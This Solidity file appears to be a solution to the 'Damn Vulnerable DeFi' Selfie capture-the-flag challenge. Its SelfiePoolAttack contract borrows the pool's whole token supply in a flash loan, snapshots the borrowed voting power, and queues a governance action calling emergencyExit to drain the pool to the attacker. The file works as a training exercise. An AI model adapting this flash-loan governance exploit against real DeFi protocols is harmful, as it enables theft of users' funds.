// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

 
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";


contract SelfiePoolAttack  is IERC3156FlashBorrower{
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    address player;
    uint256  public actionId;
    error Balance(uint256 total, uint256 userbalance );
    constructor (SelfiePool _pool, SimpleGovernance _governance, DamnValuableTokenSnapshot _token){
        pool= _pool;
        governance= _governance;
        token= _token;
        player=msg.sender;
        require(governance.getGovernanceToken()==address(_token),"another token");

     

    }

    function takeLoan()  external{
         pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), pool.maxFlashLoan(address(token)), "");

         }
    function attack() external{
        governance.executeAction{value:0}(actionId);
        require(token.balanceOf(address(pool))==0,"hack failed");
    }
   function onFlashLoan(  address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32){
        // create proposal 
        token.snapshot();
       bytes memory sig = abi.encodeWithSignature("emergencyExit(address)", player);
        actionId= governance.queueAction(address(pool),  0, sig);
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }

}
